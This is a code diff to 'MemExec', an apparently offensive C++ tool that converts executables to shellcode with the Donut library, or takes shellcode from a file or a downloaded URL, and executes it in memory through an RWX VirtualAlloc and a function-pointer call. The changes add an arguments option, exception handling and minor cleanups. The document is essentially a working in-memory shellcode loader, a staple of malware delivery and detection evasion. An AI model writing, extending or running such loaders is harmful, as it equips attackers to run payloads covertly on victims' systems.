@@ -13,6 +13,7 @@
 using namespace std;
 
 #pragma comment (lib, "Ws2_32.lib")
+#pragma comment (lib, "donut.lib")
 
 static void write_shellcode_to_file(const void* object, size_t size, string outfile) {
 #ifdef __cplusplus
@@ -33,16 +34,23 @@ static void write_shellcode_to_file(const void* object, size_t size, string outf
 }
 
 static void execute_shellcode(void *scode, size_t slen) {
-    void* exec = VirtualAlloc(0, slen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(exec, scode, slen);
-    ((void(*)())exec)();
+    try {
+        
+        void* exec = VirtualAlloc(0, slen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(exec, scode, slen);
+        ((void(*)())exec)();
+        
+    }
+    catch (const std::exception & ex) {
+        std::cerr << ex.what() << std::endl;
+    }
 }
 
 int main(int argc, char* argv[]) {
     DONUT_CONFIG c;
     int          err;
 
-
+    
     //parse arguments
     cxxopts::Options options("MemExec.exe", "Execute Program/ShellCode in memory.");
     options.positional_help("[optional args]").show_positional_help();
@@ -50,6 +58,7 @@ int main(int argc, char* argv[]) {
     options.add_options()
         ("h,help", "Print help")
         ("f,file", "Path to executable", cxxopts::value<std::string>())
+        ("a,args", "Arguments for executable", cxxopts::value<std::string>())
         ("o,output", "Write shellcode to file", cxxopts::value<std::string>())
         ("s,shellcode", "Path to shellcode", cxxopts::value<std::string>())
         ("u,url", "Download shellcode from url", cxxopts::value<std::string>())
@@ -60,12 +69,12 @@ int main(int argc, char* argv[]) {
 
     if (argc < 1) {
         std::cout << options.help({ "" }) << std::endl;
-        exit(0);
+        std::exit(0);
     }
 
     if (resultargs.count("help")) {
         std::cout << options.help({ "" }) << std::endl;
-        exit(0);
+        std::exit(0);
     }
 
     if (resultargs.count("file")) {
@@ -86,7 +95,7 @@ int main(int argc, char* argv[]) {
         // generate the shellcode
         err = DonutCreate(&c);
         if (err != DONUT_ERROR_SUCCESS) {
-            cout << " Error : " << err << "\n";
+            cout << " Donut Error : " << err << "\n";
             return 0;
         }
 
@@ -95,6 +104,9 @@ int main(int argc, char* argv[]) {
             cout << "Shellcode was generated";
             cout << "Length of Shellcode : " << c.pic_len << "\n";
             cout << "Shellcode located at : " << c.pic << "\n";
+            if (resultargs.count("args")) {
+                cout << "Arguments passed to shellcode : " << resultargs["args"].as<std::string>()  << "\n";
+            }
         }
 
         //Write Shellcode to File
@@ -106,11 +118,12 @@ int main(int argc, char* argv[]) {
         }
 
         //Execute ShellCode
-        execute_shellcode(c.pic, (size_t)c.pic_len);
+        execute_shellcode(c.pic, (size_t)c.pic_len+10);
 
+               
         DonutDelete(&c);
 
-        exit(0);
+        std::exit(0);
     }
 
     if (resultargs.count("shellcode")) {
@@ -135,12 +148,15 @@ int main(int argc, char* argv[]) {
             cout << "Shellcode was generated";
             cout << "Length of Shellcode : " << scsize << "\n";
             cout << "Shellcode located at : " << &buffer << "\n";
+            if (resultargs.count("args")) {
+                cout << "Arguments passed to shellcode : " << resultargs["args"].as<std::string>() << "\n";
+            }
         }
-
+        
         //execute shellcode
         execute_shellcode(buffer, scsize);
 
-        exit(0);
+        std::exit(0);
     }
 
     if (resultargs.count("url")) {
@@ -175,7 +191,7 @@ int main(int argc, char* argv[]) {
             std::cerr << "Request failed, error: " << e.what() << '\n';
         }
 
-        exit(0);
+        std::exit(0);
     }
 
     return 0;
